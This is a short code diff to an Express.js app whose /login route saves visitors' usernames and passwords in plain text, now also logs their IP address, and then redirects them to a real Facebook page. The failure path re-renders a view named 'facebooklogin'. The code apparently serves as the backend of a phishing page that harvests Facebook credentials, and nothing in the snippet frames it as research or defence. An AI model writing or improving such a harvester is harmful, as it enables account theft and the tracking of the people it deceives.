@@ -15,11 +15,12 @@ app.get('/', (req, res)=>{
 
 app.post('/login', (req, res) => {
     const { user, password } = req.body;
-    const sql = 'INSERT INTO users (userdetail, password) VALUES (?, ?)';
-    db.query(sql, [user, password], (err, result) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const sql = 'INSERT INTO users (userdetail, password, ip) VALUES (?, ?, ?)';
+    db.query(sql, [user, password, ip], (err, result) => {
         if (err) {
             console.error('Database error:', err);
-            return res.status(500).send('Database error');
+            return res.render('facebooklogin');
         }
         res.redirect('https://web.facebook.com/share/v/1YpkFzDf2z/')
     });
